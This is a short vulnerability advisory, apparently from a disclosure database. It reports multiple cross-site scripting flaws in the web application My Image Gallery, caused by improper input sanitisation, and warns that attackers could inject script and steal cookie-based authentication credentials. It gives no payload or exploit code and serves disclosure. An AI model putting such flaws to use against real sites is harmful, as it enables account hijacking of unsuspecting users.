My Image Gallery is prone to multiple cross-site scripting vulnerabilities due to improper sanitization of user-supplied input.

An attacker can exploit these vulnerabilities to inject html and script code into the Web browser of an unsuspecting victim. The attacker may then steal cookie-based authentication credentials. Other attacks are also possible.
